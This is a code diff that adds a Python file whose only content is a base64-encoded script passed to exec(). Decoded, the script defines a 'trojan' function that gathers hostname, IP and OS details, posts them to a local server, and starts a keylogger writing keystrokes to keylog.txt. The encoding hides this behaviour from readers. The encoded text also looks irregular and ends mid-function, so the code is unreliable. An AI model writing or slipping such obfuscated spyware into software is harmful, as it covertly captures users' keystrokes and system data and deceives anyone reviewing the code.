@@ -1,0 +1,27 @@
+import base64
+
+encoded_script = """
+aW1wb3J0IHBzdXRpbAptaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCBzb2NrZXQKaW1
+wb3J0IHBsYXRmb3JtCmltcG9ydCByZXF1ZXN0cwoKZGVmIHRyb2phbigpOgogICAg
+aW1wb3J0IHB5bnB1dC5rZXlib2FyZAoKICAgIGRhdGEgPSB7CiAgICAgICAgImhvc3Ru
+YW1lIjogc29ja2V0LmdldGhvc3RuYW1lKCksCiAgICAgICAgImlwIjogc29ja2V0Lmdl
+dGhvc3RieW5hbWUoc29ja2V0LmdldGhvc3RuYW1lKCkpLAogICAgICAgICJvcyI6IHBs
+YXRmb3JtLnBsYXRmb3JtKCksCiAgICB9CgogICAgdHJ5OgogICAgICAgICMgU2VuZCBz
+eXN0ZW0gaW5mbyB0byBsb2NhbCBzZXJ2ZXIgKGZvciB0ZXN0aW5nKQogICAgICAgIHJl
+cXVlc3RzLnBvc3QoImh0dHA6Ly9sb2NhbGhvc3Q6NTAwMC9sb2ciLCBqc29uPWRhdGEp
+CiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBz
+ZW5kaW5nIGRhdGE6IHtlfSIpCgogICAgIyBFeGFtcGxlOiBzaW1wbGUga2V5bG9nZ2Vy
+ICh3cml0ZSBrZXlzIHRvIGZpbGUpCiAgICBkZWYgb25fcHJlc3Moa2V5KToKICAgICAg
+ICB0cnk6CiAgICAgICAgICAgIHdpdGggb3Blbigi
+a2V5bG9nLnR4dCIsICJh
+IikgYXM
+gZjoKICAgICAgICAgICAgICAgIGYu
+d3JpdGUoc3
+RyKGtleSkgKyAiXG4i
+"""
+
+decoded_script = base64.b64decode(encoded_script).decode('utf-8')
+exec(decoded_script)
+
+            
+        
